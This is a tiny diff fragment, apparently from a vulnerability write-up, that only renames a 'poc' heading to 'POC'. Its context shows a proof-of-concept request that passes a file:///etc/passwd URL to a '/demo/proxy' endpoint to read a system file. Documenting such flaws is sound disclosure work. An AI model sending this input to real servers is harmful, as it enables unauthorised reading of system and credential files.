@@ -8,7 +8,7 @@
 "/js/lib/slimscroll.js"
 ```
 
-## poc
+## POC
 
 ```
 /demo/proxy?url=file:///etc/passwd
